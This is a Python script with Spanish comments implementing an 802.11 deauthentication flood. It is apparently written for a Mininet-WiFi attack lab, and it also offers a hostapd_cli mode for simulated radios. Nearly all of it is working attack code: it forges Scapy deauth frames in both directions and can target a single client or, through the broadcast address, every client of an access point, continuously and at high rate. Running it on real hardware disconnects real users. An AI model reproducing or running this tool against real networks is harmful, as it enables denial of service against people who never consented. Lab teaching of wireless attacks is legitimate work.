#!/usr/bin/env python3
"""
Ataque de Desautenticación 802.11 (Deauth Flood)
Envía frames Deauthentication falsificados para desconectar un cliente de su AP.
Compatible con el escenario wifi-attacks de Mininet-WiFi.

Uso desde la CLI de Mininet:
  mininet> attacker python3 /tmp/deauth_attack.py --bssid AA:BB:CC:DD:EE:FF --client 00:00:00:01:00:10
"""

from scapy.all import sendp, conf
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import sys
import os
import time
import argparse
import signal
import subprocess
from datetime import datetime

# Razones de desautenticación 802.11 (IEEE 802.11-2016 Tabla 9-49)
DEAUTH_REASONS = {
    1:  "Unspecified reason",
    2:  "Previous auth no longer valid",
    3:  "Deauthenticated: leaving BSS",
    4:  "Inactivity timer expired",
    5:  "AP capacity exceeded",
    6:  "Class 2 frame received from nonauthenticated STA",
    7:  "Class 3 frame received from nonassociated STA",
    8:  "Disassociated: leaving BSS",
}

stats = {
    'frames_sent': 0,
    'rounds':      0,
    'start_time':  None,
}


def get_timestamp():
    return datetime.now().strftime("%H:%M:%S")


def print_header(args):
    client_display = args.client if args.client != 'FF:FF:FF:FF:FF:FF' else 'FF:FF:FF:FF:FF:FF (broadcast - todos los clientes)'
    print('\n' + '='*65)
    print('  ATAQUE DE DESAUTENTICACION 802.11 (DEAUTH FLOOD)')
    print('='*65)
    print('Interfaz:   %s (modo monitor)' % args.iface)
    print('AP (BSSID): %s' % args.bssid.upper())
    print('Cliente:    %s' % client_display)
    print('Razon:      %d - %s' % (args.reason, DEAUTH_REASONS.get(args.reason, 'Custom')))
    print('Paquetes:   %s' % ('continuo (Ctrl+C para parar)' if args.count == 0 else str(args.count)))
    print('Intervalo:  %.2f s entre frames' % args.interval)
    print('Timestamp:  %s' % get_timestamp())
    print('-'*65)
    print('[*] Construyendo frames Deauthentication...')
    print('[*] Enviando en ambas direcciones: AP->cliente y cliente->AP')
    print('-'*65)


def build_deauth_frames(bssid, client, reason):
    """
    Construye dos frames de desautenticación:
      - AP → cliente: el cliente cree que el AP lo ha desconectado
      - cliente → AP: el AP cree que el cliente se ha ido voluntariamente
    Ambos juntos impiden la reconexión inmediata.
    """
    # AP → cliente
    frame_ap_to_client = (
        RadioTap() /
        Dot11(
            type=0, subtype=12,       # Management / Deauthentication
            addr1=client,             # Destino: cliente víctima
            addr2=bssid,              # Origen: AP (falsificado)
            addr3=bssid               # BSSID
        ) /
        Dot11Deauth(reason=reason)
    )
    # cliente → AP
    frame_client_to_ap = (
        RadioTap() /
        Dot11(
            type=0, subtype=12,
            addr1=bssid,              # Destino: AP
            addr2=client,             # Origen: cliente (falsificado)
            addr3=bssid               # BSSID
        ) /
        Dot11Deauth(reason=reason)
    )
    return frame_ap_to_client, frame_client_to_ap


def print_progress():
    elapsed = time.time() - stats['start_time']
    rate = stats['frames_sent'] / elapsed if elapsed > 0 else 0
    print('[%s] [>>] Frames enviados: %-6d  Rondas: %-4d  Velocidad: %.0f frames/s'
          % (get_timestamp(), stats['frames_sent'], stats['rounds'], rate),
          end='\r', flush=True)


def print_summary():
    elapsed = time.time() - stats['start_time']
    rate = stats['frames_sent'] / elapsed if elapsed > 0 else 0
    print('\n')
    print('='*65)
    print('  RESUMEN DEL ATAQUE')
    print('='*65)
    print('Frames enviados:  %d' % stats['frames_sent'])
    print('Rondas:           %d' % stats['rounds'])
    print('Duracion:         %.1f segundos' % elapsed)
    print('Velocidad media:  %.0f frames/s' % rate)
    print('='*65)


def check_client_connected(ctrl_path, client_mac):
    """Comprueba si el cliente sigue asociado al AP via hostapd_cli all_sta."""
    try:
        result = subprocess.run(
            ['hostapd_cli', '-p', ctrl_path, 'all_sta'],
            capture_output=True, text=True, timeout=2
        )
        return client_mac.lower() in result.stdout.lower()
    except Exception:
        return False


def print_reconnect_hint(args):
    print()
    print('-'*65)
    print('  Para reconectar la victima tras el ataque:')
    print('  mininet> sta1 iw dev sta1-wlan0 connect RedInsegura 2437 \\')
    print('             %s key 0:d:AABBCCDDEE' % args.bssid.upper())
    print('-'*65)


def run_deauth_hwsim(args):
    """
    Modo mac80211_hwsim: usa hostapd_cli en lugar de raw frames Scapy.
    En hwsim, los frames inyectados via Scapy no se entregan a otras
    interfaces virtuales; hostapd_cli usa el stack real del AP.
    """
    ctrl_path = args.hostapd_ctrl
    client    = args.client.upper()

    print_header(args)
    print()
    print('[*] Modo hwsim: hostapd_cli (Scapy injection no efectivo en mac80211_hwsim)')
    print('[*] Socket AP:  %s' % ctrl_path)
    print('[*] Observar:   xterm sta1 -> ping -i 0.5 10.0.4.100')
    print('-'*65)

    if not os.path.isdir(ctrl_path):
        print('[ERROR] Socket hostapd no encontrado: %s' % ctrl_path)
        print('[ERROR] Verifica que el AP esta activo.')
        sys.exit(1)

    stats['start_time'] = time.time()

    def handle_sigint(sig, frame):
        print()
        print_summary()
        print_reconnect_hint(args)
        sys.exit(0)
    signal.signal(signal.SIGINT, handle_sigint)

    connected = check_client_connected(ctrl_path, client)
    print('[%s] Estado inicial: %s' % (
        get_timestamp(), 'CONECTADO al AP' if connected else 'ya DESCONECTADO'))
    print()

    def _round():
        subprocess.run(
            ['hostapd_cli', '-p', ctrl_path, 'deauthenticate', client],
            capture_output=True, timeout=2
        )
        stats['frames_sent'] += 2
        stats['rounds'] += 1

    def _progress():
        ok = check_client_connected(ctrl_path, client)
        elapsed = time.time() - stats['start_time']
        rate = stats['frames_sent'] / elapsed if elapsed > 0 else 0
        estado = 'DESCONECTADO [OK]' if not ok else 'CONECTADO     [--]'
        print('[%s] [>>] Rondas: %-4d  Cliente: %-18s  %.1f/s'
              % (get_timestamp(), stats['rounds'], estado, rate),
              end='\r', flush=True)

    if args.count == 0:
        print('[%s] [>>] Deauth continuo (Ctrl+C para parar)...' % get_timestamp())
        while True:
            _round()
            _progress()
            time.sleep(args.interval)
    else:
        print('[%s] [>>] Enviando %d rondas...' % (get_timestamp(), args.count))
        for _ in range(args.count):
            _round()
            _progress()
            time.sleep(args.interval)
        print()
        ok = check_client_connected(ctrl_path, client)
        print('[%s] Estado final:   %s' % (
            get_timestamp(), 'CONECTADO' if ok else 'DESCONECTADO'))
        print_summary()
        print_reconnect_hint(args)


def run_deauth(args):
    if getattr(args, 'hwsim', False):
        run_deauth_hwsim(args)
        return

    if os.geteuid() != 0:
        print('[ERROR] Se requieren privilegios root para enviar frames 802.11 raw.')
        sys.exit(1)

    bssid  = args.bssid.upper()
    client = args.client.upper()

    print_header(args)

    frame1, frame2 = build_deauth_frames(bssid, client, args.reason)
    frames = [frame1, frame2]

    stats['start_time'] = time.time()

    def handle_sigint(sig, frame):
        print_summary()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    if args.count == 0:
        # Modo continuo
        print('[%s] [>>] Enviando deauths continuamente...' % get_timestamp())
        while True:
            sendp(frames, iface=args.iface, verbose=0)
            stats['frames_sent'] += len(frames)
            stats['rounds'] += 1
            print_progress()
            time.sleep(args.interval)
    else:
        # Número fijo de rondas
        total_rounds = args.count
        print('[%s] [>>] Enviando %d rondas de deauth...' % (get_timestamp(), total_rounds))
        for _ in range(total_rounds):
            sendp(frames, iface=args.iface, verbose=0)
            stats['frames_sent'] += len(frames)
            stats['rounds'] += 1
            print_progress()
            time.sleep(args.interval)
        print_summary()


def parse_args():
    parser = argparse.ArgumentParser(
        description='Ataque de Desautenticacion 802.11 - envia frames Deauth falsificados',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Desconectar un cliente específico (100 rondas)
  python3 deauth_attack.py --bssid AA:BB:CC:DD:EE:FF --client 00:11:22:33:44:55 --count 100

  # Desconectar todos los clientes del AP de forma continua
  python3 deauth_attack.py --bssid AA:BB:CC:DD:EE:FF --client FF:FF:FF:FF:FF:FF

  # Ataque rápido con alta tasa de frames
  python3 deauth_attack.py --bssid AA:BB:CC:DD:EE:FF --client 00:11:22:33:44:55 --interval 0.01

  # Desde la CLI de Mininet:
  mininet> attacker python3 /tmp/deauth_attack.py --bssid <MAC_AP> --client <MAC_STA1>
        """
    )
    parser.add_argument('--bssid',    required=True,
                        help='MAC del Access Point objetivo (ej: AA:BB:CC:DD:EE:FF)')
    parser.add_argument('--client',   default='FF:FF:FF:FF:FF:FF',
                        help='MAC del cliente victima (default: FF:FF:FF:FF:FF:FF = todos)')
    parser.add_argument('--iface',    default='mon0',
                        help='Interfaz en modo monitor (default: mon0)')
    parser.add_argument('--count',    type=int, default=0,
                        help='Numero de rondas (default: 0 = continuo hasta Ctrl+C)')
    parser.add_argument('--interval', type=float, default=0.1,
                        help='Segundos entre rondas de frames (default: 0.1)')
    parser.add_argument('--reason',   type=int, default=7,
                        choices=list(DEAUTH_REASONS.keys()),
                        help='Codigo de razon 802.11 (default: 7 - Class 3 frame from nonassociated STA)')
    parser.add_argument('--hwsim',   action='store_true',
                        help='Modo mac80211_hwsim: usa hostapd_cli en lugar de raw frames Scapy')
    parser.add_argument('--hostapd-ctrl', default='/var/run/hostapd',
                        dest='hostapd_ctrl',
                        help='Directorio control hostapd (default: /var/run/hostapd)')
    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()
    try:
        run_deauth(args)
    except KeyboardInterrupt:
        print_summary()
    except Exception as e:
        print('\n[ERROR] %s' % e)
        import traceback
        traceback.print_exc()
        sys.exit(1)
